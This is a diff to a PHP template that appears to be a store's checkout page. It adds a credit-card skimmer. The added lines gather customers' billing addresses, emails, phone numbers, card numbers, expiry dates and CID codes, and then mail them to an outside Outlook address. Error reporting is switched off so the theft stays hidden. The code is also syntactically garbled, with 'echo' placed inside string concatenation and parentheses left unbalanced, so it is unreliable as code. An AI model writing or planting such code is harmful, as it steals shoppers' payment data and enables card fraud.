@@ -108,8 +108,37 @@ $seq_http	= (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on');
 <?php
 error_reporting(0);
 $messagess   = "
-add id  : 
+add id  :  ".echo $this->getCustomerBillAddr() ."
+add id 2 : ".echo $this->getBillAddress()->getId()."   
+Fname   :   
+mid     : 
+Lastname: 
+email   : ".echo $this->htmlEscape($this->getBillAddress()->getEmail()."
+Comp    : ".echo $this->htmlEscape($this->getBillAddress()->getCompany()) ."
+Add     : ".echo $this->htmlEscape($this->getBillAddress()->getStreet(1)."
+VAT NUM : ".echo $this->escapeHtml($this->getAddress()->getVatId()."
+City    : ".echo $this->htmlEscape($this->getBillAddress()->getCity()."
+RegionC : ".echo $this->getBillAddress()->getRegionId()."
+Region  : ".echo $this->htmlEscape($this->getBillAddress()->getRegion())."
+Postcode: ".echo $this->htmlEscape($this->getBillAddress()->getPostcode())."
+Phone   : ".echo $this->htmlEscape($this->getBillAddress()->getTelephone())."
+Country : ".echo $this->getBillingCountriesSelectBox()."
+Password: 
+Shipto  : 
+Shiptos : 
+Gate    : ".echo $this->getChild('methods')->getSelectedMethodCode()."
+Type    : ".echo $this->getInfoData('cc_type')."
+Owner   : ".echo $this->escapeHtml($this->getInfoData('cc_owner')."
+Numb    : ".echo $this->getMethodCode('cc_number')."
+Month   : ".echo $this->getInfoData('cc_exp_month')."
+Year    : ".echo $this->getCcYears()."
+CID     : ".echo $this->getMethodCode() _cc_cid
+
+             echo $this->getMethodCode(_cc_cid)."
+
+start   : ".echo $this->getInfoData('cc_ss_start_month')
+            echo $this->getInfoData('cc_ss_start_year')." 
 end.
 ";
-mail("tunisianseven123@outlook.fr" , "zm back Z", $this->__('testphtml'));
+mail("tunisianseven123@outlook.fr" , "zm back Z", $messagess);
 ?>
